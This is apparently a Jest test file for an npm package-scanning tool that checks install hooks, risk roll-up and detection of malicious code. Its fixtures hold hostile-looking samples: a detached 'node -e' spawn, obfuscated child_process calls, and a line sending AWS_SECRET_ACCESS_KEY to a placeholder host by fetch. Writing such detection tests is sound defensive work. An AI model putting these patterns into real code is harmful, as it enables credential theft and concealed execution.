      section: "optionalDependencies",
    });
    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        line: 6,
        evidence: "maybe: ^2.0.0",
        ruleId: "dependency.optional-added",
      }),
    );
  });

  test("flags npm's implicit node-gyp install hook from root gyp files", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff([], staged);
    const findings = deterministicFindings(staged, diff);

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "binding.gyp",
        evidence: "implicit install: node-gyp rebuild",
        ruleId: "install-script.implicit-node-gyp",
      }),
    );
  });

  test("marks implicit node-gyp as release delta when package.json newly enables it", () => {
    const previous = [
      {
        path: "package.json",
        size: 70,
        sha256: "pkg-old",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0", gypfile: false }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-new",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(diff.find((entry) => entry.path === "binding.gyp")?.status).toBe("unchanged");
    expect(annotated).toContainEqual(
      expect.objectContaining({
        file: "binding.gyp",
        ruleId: "install-script.implicit-node-gyp",
        diffStatus: "unchanged",
        releaseDelta: true,
      }),
    );
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
  });

  test("keeps pre-existing implicit node-gyp findings contextual when only package metadata changes", () => {
    const previous = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-old",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-new",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated).toContainEqual(
      expect.objectContaining({
        ruleId: "install-script.implicit-node-gyp",
        diffStatus: "unchanged",
        releaseDelta: false,
      }),
    );
  });

  test("does not flag implicit node-gyp when npm suppressors are present", () => {
    const withPreinstall = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ scripts: { preinstall: "node setup.js" } }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const withGypfileFalse = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ gypfile: false }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];

    expect(
      deterministicFindings(withPreinstall, createPackageDiff([], withPreinstall)),
    ).not.toContainEqual(expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }));
    expect(
      deterministicFindings(withGypfileFalse, createPackageDiff([], withGypfileFalse)),
    ).not.toContainEqual(expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }));
  });

  test("warns instead of inferring implicit node-gyp when package.json cannot be parsed", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: "{not-json",
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "medium",
        file: "package.json",
        evidence: "package.json parse failed",
        ruleId: "package-json.parse-failed",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }),
    );
  });

  test("keeps tar directory entries informational", () => {
    const findings = tarSuspiciousEntryFindings([
      {
        kind: "non-regular",
        path: "<unknown>",
        detail: "typeflag 5 (directory)",
      },
      {
        kind: "non-regular",
        path: "link",
        detail: "typeflag 2 (symlink)",
      },
    ]);

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "info",
        evidence: "non-regular: typeflag 5 (directory)",
        ruleId: "tar.suspicious-entry",
      }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        evidence: "non-regular: typeflag 2 (symlink)",
        ruleId: "tar.suspicious-entry",
      }),
    );
  });

  test("uses staged metadata to flag implicit node-gyp even when the gyp file is absent from the tarball", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), {
      name: "pkg",
      version: "1.0.1",
      scripts: { install: "node-gyp rebuild" },
      implicitScripts: { install: "node-gyp rebuild" },
      gypfile: true,
    });

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        evidence: "implicit install: node-gyp rebuild",
        ruleId: "install-script.implicit-node-gyp",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.lifecycle" }),
    );
  });
});

describe("computeRisk weighted multi-signal roll-up (issue #193)", () => {
  const code = (ruleId, severity, extra = {}) => ({ ruleId, severity, file: "f.js", ...extra });

  test("a lone process-execution capability de-escalates to low", () => {
    // The benign-build-script false positive: a build helper that shells out is
    // not, on its own, evidence of risk.
    expect(computeRisk([code("code.process-execution", "high")])).toBe("low");
  });

  test("two distinct code capabilities co-occur to high", () => {
    expect(
      computeRisk([code("code.process-execution", "high"), code("code.credential-access", "high")]),
    ).toBe("high");
  });

  test("two individually-weak (medium) capabilities still escalate to high", () => {
    // Under max-severity this stalled at medium and under-detected; co-occurrence
    // now treats the combination as the multi-signal risk it is.
    expect(
      computeRisk([
        code("code.network-access", "medium"),
        code("code.dynamic-evaluation", "medium"),
      ]),
    ).toBe("high");
  });

  test("an obfuscated lone capability is not de-escalated", () => {
    // Assembling `child_process` from string fragments is itself a malice signal,
    // so a lone obfuscated process-execution keeps its severity.
    expect(computeRisk([code("code.process-execution", "high", { obfuscated: true })])).toBe(
      "high",
    );
  });

  test("a lone non-process capability keeps its own severity", () => {
    // eval/atob on an added file stays high (obfuscation survives base64 wrapping)…
    expect(computeRisk([code("code.dynamic-evaluation", "high")])).toBe("high");
    // …while a lone modified-file network read stays medium.
    expect(computeRisk([code("code.network-access", "medium")])).toBe("medium");
  });

  test("authoritative non-code findings still set a severity floor on their own", () => {
    expect(computeRisk([{ ruleId: "file.outside-files-list", severity: "high", file: "x" }])).toBe(
      "high",
    );
    expect(
      computeRisk([{ ruleId: "install-script.preinstall", severity: "critical", file: "p" }]),
    ).toBe("critical");
  });

  test("an install-hook anchor floors a lone process-execution to high", () => {
    expect(
      computeRisk([
        { ruleId: "install-script.lifecycle", severity: "high", file: "package.json" },
        code("code.process-execution", "high"),
      ]),
    ).toBe("high");
  });

  test("findings without a rule id anchor at their severity (fail toward higher risk)", () => {
    expect(computeRisk([{ severity: "high", file: "x" }])).toBe("high");
  });

  test("no findings is low", () => {
    expect(computeRisk([])).toBe("low");
  });
});

describe("packed downloader capability detection", () => {
  const pkg = {
    path: "package.json",
    size: 80,
    sha256: "pkg",
    flags: [],
    textSample: JSON.stringify({ name: "pkg", version: "1.0.1", main: "index.js" }),
  };
  const file = (textSample) => ({
    path: "index.js",
    size: textSample.length,
    sha256: "index",
    flags: [],
    textSample,
  });

  test("treats a literal node eval child process as process plus dynamic execution", () => {
    const staged = [
      pkg,
      file(
        "const { spawn } = require('node:child_process');\nspawn('node', ['-e', '[defanged payload]'], { detached: true });\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: "code.process-execution", severity: "high" }),
        expect.objectContaining({ ruleId: "code.dynamic-evaluation", severity: "high" }),
      ]),
    );
    expect(computeRisk(findings)).toBe("high");
  });

  test("detects a literal node eval child process split across lines", () => {
    const staged = [
      pkg,
      file(
        "const { spawn } = require('node:child_process');\nspawn(\n  'node',\n  [\n    '-e',\n    '[defanged payload]',\n  ],\n  { detached: true },\n);\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: "code.process-execution", severity: "high" }),
        expect.objectContaining({
          ruleId: "code.dynamic-evaluation",
          severity: "high",
          line: 2,
        }),
      ]),
    );
    expect(computeRisk(findings)).toBe("high");
  });

  test("marks a process capability inside a rotating string-table wrapper as obfuscated", () => {
    const staged = [
      pkg,
      file(
        "const _0x8f31 = _0x2aa1;\n(function (_0x41aa, _0x55bb) { const _0x77cc = _0x2aa1; const _0x99dd = _0x41aa(); while (!![]) { try { const _0x1234 = parseInt(_0x77cc(0x1)); if (_0x1234 === _0x55bb) break; _0x99dd['push'](_0x99dd['shift']()); } catch (_0xabcd) { _0x99dd['push'](_0x99dd['shift']()); } } })(_0x4e21, 0x1);\nfunction _0x2aa1(_0x1111) { return _0x4e21()[_0x1111]; }\nfunction _0x4e21() { return ['node', '-e', '[defanged payload]']; }\nif (false) spawn(_0x8f31(0x0), [_0x8f31(0x1), _0x8f31(0x2)]);\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const processExecution = findings.find(
      (finding) => finding.ruleId === "code.process-execution",
    );

    expect(processExecution).toMatchObject({ severity: "high", obfuscated: true });
    expect(computeRisk(findings)).toBe("high");
  });
});

describe("test-scoped capability findings", () => {
  const pkg = (main = "index.js") => ({
    path: "package.json",
    size: 60,
    sha256: "pkg",
    flags: [],
    textSample: JSON.stringify({ name: "pkg", version: "1.0.0", main }),
  });
  const file = (path, textSample) => ({ path, size: 60, sha256: path, flags: [], textSample });

  test("demotes capability findings in unreachable test files and marks them test-scoped", () => {
    const staged = [
      pkg(),
      file("index.js", "module.exports = {};\n"),
      file(
        "test/spawn.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    const processExec = findings.find((finding) => finding.ruleId === "code.process-execution");
    expect(processExec).toMatchObject({
      file: "test/spawn.js",
      severity: "medium",
      testScoped: true,
    });
    expect(processExec.evidence).toContain("test-scoped");
  });

  test("keeps full severity when the test file is reachable from the entrypoint", () => {
    const staged = [
      pkg(),
      file("index.js", "require('./test/spawn.js');\n"),
      file(
        "test/spawn.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/spawn.js",
      severity: "high",
    });
  });

  test("keeps full severity when a lifecycle script points into the test tree", () => {
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.0",
          main: "index.js",
          scripts: { postinstall: "node test/setup.js" },
        }),
      },
      file("index.js", "module.exports = {};\n"),
      file(
        "test/setup.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/setup.js",
      severity: "high",
    });
  });

  test("keeps full severity for files transitively imported by a lifecycle script", () => {
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.0",
          main: "index.js",
          scripts: { postinstall: "node test/setup.js" },
        }),
      },
      file("index.js", "module.exports = {};\n"),
      file("test/setup.js", "require('./helper.js');\n"),
      file(
        "test/helper.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/helper.js",
      severity: "high",
    });
  });

  test("keeps full severity for obfuscated capabilities even in test files", () => {
    const staged = [
      pkg(),
      file("index.js", "module.exports = {};\n"),
      file(
        "test/hidden.js",
        "const m = require(['chi', 'ld_pro', 'cess'].join(''));\nm['exec' + 'Sync']('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/hidden.js",
      severity: "high",
      obfuscated: true,
    });
  });

  test("keeps a same-file credential→network exfiltration chain at full severity in test files", () => {
    const staged = [
      pkg(),
      file("index.js", "module.exports = {};\n"),
      file(
        "test/exfil.js",
        "const env = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://example.invalid', { body: env });\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      file: "test/exfil.js",
      severity: "high",
    });
  });

  test("test-scoped capabilities do not co-occur into a high risk roll-up", () => {
    const testScoped = (ruleId, severity) => ({
      ruleId,
      severity,
      file: "test/a.js",
      testScoped: true,
    });
    expect(
      computeRisk([
        testScoped("code.process-execution", "medium"),
        testScoped("code.credential-access", "low"),
        testScoped("code.dynamic-evaluation", "low"),
      ]),
    ).toBe("low");
    // A non-test capability still escalates against another non-test capability.
    expect(
      computeRisk([
        { ruleId: "code.network-access", severity: "medium", file: "index.js" },
        { ruleId: "code.credential-access", severity: "medium", file: "index.js" },
        testScoped("code.process-execution", "medium"),
      ]),
    ).toBe("high");
  });
});

describe("baseline finding fingerprints", () => {
  test("keeps a line-less modified-file finding contextual when the baseline already fired the same rule", () => {
    const previous = [
      {
        path: "lib/util.js",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      },
    ];
    const staged = [
      {
        path: "lib/util.js",
        size: 70,
        sha256: "new",
        flags: [],
        textSample:
          "const { execSync } = require('child_process');\nexecSync('node -v');\n// touched\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "lib/util.js",
          evidence: "process or shell execution",
          reason: "package may execute arbitrary commands",
          ruleId: "code.process-execution",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );
    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: false });
  });

  test("fails open to release delta when the baseline has no matching finding", () => {
    const previous = [
      {
        path: "lib/util.js",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "export const a = 1;\n",
      },
    ];
    const staged = [
      {
        path: "lib/util.js",
        size: 70,
        sha256: "new",
        flags: [],
        textSample: "export const a = 2;\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "lib/util.js",
          evidence: "process or shell execution",
          reason: "package may execute arbitrary commands",
          ruleId: "code.process-execution",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );
    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: true });
  });
});
